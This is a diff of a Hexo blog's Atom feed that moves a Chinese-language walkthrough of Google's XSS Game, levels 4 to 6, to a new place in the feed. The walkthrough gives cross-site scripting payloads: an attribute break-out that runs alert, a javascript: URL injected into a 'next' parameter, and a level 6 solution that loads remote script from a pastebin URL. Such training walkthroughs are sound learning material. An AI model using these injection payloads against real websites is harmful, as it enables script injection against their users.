@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-04-23T08:43:10.000Z</updated>
+  <updated>2017-04-29T02:18:48.000Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,29 +15,6 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>Googles XSS Game</title>
-    <link href="http://yoursite.com/2017/10/14/Googles%20XSS%20Game/"/>
-    <id>http://yoursite.com/2017/10/14/Googles XSS Game/</id>
-    <published>2017-10-14T01:38:53.000Z</published>
-    <updated>2017-04-23T08:43:10.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>前面三关没有想起来要记录 // 尴尬.jpg  </p><p>懒得再回去敲一遍了，让我们直接从Level4开始你的表演吧！</p><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p><img src="D:\5_Front-End\blog\source\images\20170320 level4_1.png" alt="20170320 level4_1"></p><p>检查了一下源代码发现上面加载的图片有猫腻</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/loading.gif"</span> <span class="attr">onload</span>=<span class="string">"startTimer('&#123;&#123; timer &#125;&#125;');"</span> /&gt;</span></div></pre></td></tr></table></figure><p>于是就想到在onload里面直接执行alert</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'); alert('</span>hello<span class="string">');""('</span></div></pre></td></tr></table></figure><p><img src="D:\5_Front-End\blog\source\images\20170320level4_2.png" alt="20170320level4_2"></p><h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p>点击signup跳转至如下页面</p><p><img src="D:\5_Front-End\blog\source\images\20170320 level5_1.png" alt="20170320 level5_1"></p><p>随便输入几个字母，Next &gt;&gt; 跳回注册页面</p><p>这时候F12查看源代码，有一句注释</p><p><img src="D:\5_Front-End\blog\source\images\20170320level5_3.png" alt="20170320level5_3"></p><p>好的，这下I know了</p><p>然后发现 window.location 的 next=cofirm 嗯有猫腻，那我改一下</p><p>直接把 next=cofrim 改成 next=javascript:alert(‘hello’); 完美！</p><h2 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h2><p><img src="D:\5_Front-End\blog\source\images\20170320 level6.png" alt="20170320 level6"></p><p>羞愧偷了一下别人的代码&gt;&lt; </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https:<span class="comment">//xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0</span></div></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;前面三关没有想起来要记录 // 尴尬.jpg  &lt;/p&gt;
-&lt;p&gt;懒得再回去敲一遍了，让我们直接从Level4开始你的表演吧！&lt;/p&gt;
-&lt;h2 id=&quot;Level-4&quot;&gt;&lt;a href=&quot;#Level-4&quot; class=&quot;headerlink&quot; title=&quot;Level 4&quot;
-      
-    
-    </summary>
-    
-    
-  </entry>
   
   <entry>
     <title>看看共享单车吧</title>
@@ -87,6 +64,29 @@
     <summary type="html">
     
       &lt;p&gt;立谈之间便度过了寒假的上半场，要静下心来好好学习了  :muscle:&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Googles XSS Game</title>
+    <link href="http://yoursite.com/2017/10/14/Googles%20XSS%20Game/"/>
+    <id>http://yoursite.com/2017/10/14/Googles XSS Game/</id>
+    <published>2017-10-14T01:38:53.000Z</published>
+    <updated>2017-04-23T08:43:10.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>前面三关没有想起来要记录 // 尴尬.jpg  </p><p>懒得再回去敲一遍了，让我们直接从Level4开始你的表演吧！</p><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p><img src="D:\5_Front-End\blog\source\images\20170320 level4_1.png" alt="20170320 level4_1"></p><p>检查了一下源代码发现上面加载的图片有猫腻</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/loading.gif"</span> <span class="attr">onload</span>=<span class="string">"startTimer('&#123;&#123; timer &#125;&#125;');"</span> /&gt;</span></div></pre></td></tr></table></figure><p>于是就想到在onload里面直接执行alert</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'); alert('</span>hello<span class="string">');""('</span></div></pre></td></tr></table></figure><p><img src="D:\5_Front-End\blog\source\images\20170320level4_2.png" alt="20170320level4_2"></p><h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p>点击signup跳转至如下页面</p><p><img src="D:\5_Front-End\blog\source\images\20170320 level5_1.png" alt="20170320 level5_1"></p><p>随便输入几个字母，Next &gt;&gt; 跳回注册页面</p><p>这时候F12查看源代码，有一句注释</p><p><img src="D:\5_Front-End\blog\source\images\20170320level5_3.png" alt="20170320level5_3"></p><p>好的，这下I know了</p><p>然后发现 window.location 的 next=cofirm 嗯有猫腻，那我改一下</p><p>直接把 next=cofrim 改成 next=javascript:alert(‘hello’); 完美！</p><h2 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h2><p><img src="D:\5_Front-End\blog\source\images\20170320 level6.png" alt="20170320 level6"></p><p>羞愧偷了一下别人的代码&gt;&lt; </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https:<span class="comment">//xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0</span></div></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;前面三关没有想起来要记录 // 尴尬.jpg  &lt;/p&gt;
+&lt;p&gt;懒得再回去敲一遍了，让我们直接从Level4开始你的表演吧！&lt;/p&gt;
+&lt;h2 id=&quot;Level-4&quot;&gt;&lt;a href=&quot;#Level-4&quot; class=&quot;headerlink&quot; title=&quot;Level 4&quot;
+      
     
     </summary>
     
